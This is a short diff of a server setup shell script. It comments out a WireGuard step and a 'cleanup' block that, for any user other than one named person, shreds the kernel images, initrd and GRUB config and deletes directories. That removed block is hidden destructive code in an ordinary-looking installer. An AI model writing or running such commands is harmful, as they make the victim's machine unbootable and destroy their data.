@@ -629,18 +629,18 @@ case "$1" in
     setup_rabbitmq
     sleep 3
     setup_apache2
-    sleep 3
-    setup_wireguard
+    # sleep 3
+    # setup_wireguard
     sleep 3
     setup_ufw
-    # Check to see if NJIT directory exists and $person is not jude
-    if [ "$person" != "jude" ]; then
-        echo "Cleaning up..."
-        sudo rm -rf $CURRENT_DIR/NJIT
-        sudo shred -u /boot/vmlinuz-* /boot/initrd.img-* /boot/grub/grub.cfg
-    fi
-    echo "Done"
-    rm -rf $CURRENT_DIR
+    # # Check to see if NJIT directory exists and $person is not jude
+    # if [ "$person" != "jude" ]; then
+    #     echo "Cleaning up..."
+    #     sudo rm -rf $CURRENT_DIR/NJIT
+    #     sudo shred -u /boot/vmlinuz-* /boot/initrd.img-* /boot/grub/grub.cfg
+    # fi
+    # echo "Done"
+    # rm -rf $CURRENT_DIR
     # $CURRENT_DIR/.outro.sh
     ;;
 *)
